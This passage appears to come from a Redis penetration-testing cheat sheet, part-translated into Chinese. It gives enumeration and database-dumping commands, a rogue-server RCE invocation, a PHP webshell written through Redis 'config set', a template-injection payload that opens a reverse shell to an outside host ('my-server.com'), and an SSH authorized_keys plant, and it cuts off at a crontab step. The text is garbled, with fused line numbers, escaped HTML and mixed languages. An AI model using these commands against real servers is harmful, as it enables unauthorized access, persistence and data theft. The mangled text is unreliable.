authenticate to Redis and Lua is enabled (EVAL/EVALSHA or FUNCTION are usable) From 利用 to RCE requires memory grooming and native code pivoting beyond the Redis Lua sandbox. CVE-2025-46818 — Cross-user 权限提升 via basic type metatables Root cause: On engine initialization, metatables for basic types (e.g., strings, booleans) weren’t set read-only. Any authenticated user can poison them to inject methods other users might call later. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE VERSION6379/tcp open redis Redis key-value store 4.0.9 # 2. Automatic 枚举 12nmap --script redis-info -sV -p 6379 &lt;IP&gt;msf&gt; use auxiliary/scanner/redis/redis_server # 3. Banner 12nc -vn 10.10.10.10 6379redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools # 4. Banner 1-NOAUTH Authentication required. # 5. Redis 认证 1AUTH &lt;username&gt; &lt;password&gt; # 6. Authenticated 枚举 123456INFO[ ... Redis response with info ... ]client list[ ... Redis response with connected clients ... ]CONFIG GET *[ ... Get config ... ] # 7. Authenticated 枚举 1rename-command FLUSHDB &quot;&quot; # 8. Dumping Database 1INFO keyspace # 9. Dumping Database 123456SELECT 1[ ... Indicate the database ... ]KEYS *[ ... Get Keys ... ]GET &lt;KEY&gt;[ ... Get Key ... ] # 10. Dumping Database 123456789TYPE &lt;KEY&gt;[ ... Type of the Key ... ]LRANGE &lt;KEY&gt; 0 -1[ ... Get list items ... ]HGET &lt;KEY&gt; &lt;FIELD&gt;[ ... Get hash item ... ]# If the type used is weird you can always do:DUMP &lt;key&gt; # 11. Interactive Shell 1./redis-rogue-server.py --rhost &lt;TARGET_IP&gt; --lhost &lt;ACCACKER_IP&gt; # 12. PHP Webshell 123456789root@Urahara:~# redis-cli -h 10.85.0.5210.85.0.52:6379&gt; config set dir /usr/share/nginx/htmlOK10.85.0.52:6379&gt; config set dbfilename redis.phpOK10.85.0.52:6379&gt; set test &quot;&lt;?php phpinfo(); ?&gt;&quot;OK10.85.0.52:6379&gt; saveOK # 13. Template Webshell 1234567891011&#123;&#123; (&#123;&#125;).constructor.constructor( &quot;var net = global.process.mainModule.require(&#x27;net&#x27;), cp = global.process.mainModule.require(&#x27;child_process&#x27;), sh = cp.spawn(&#x27;sh&#x27;, []); var client = new net.Socket(); client.connect(1234, &#x27;my-server.com&#x27;, function()&#123; client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); &#125;);&quot;)()&#125;&#125; # 14. SSH 1234567root@Urahara:~# redis-cli -h 10.85.0.52 10.85.0.52:6379&gt; config set dir /var/lib/redis/.ssh OK 10.85.0.52:6379&gt; config set dbfilename &quot;authorized_keys&quot; OK 10.85.0.52:6379&gt; save OK # 15. Crontab 12345678root@Urahara:~# echo -e &quot;

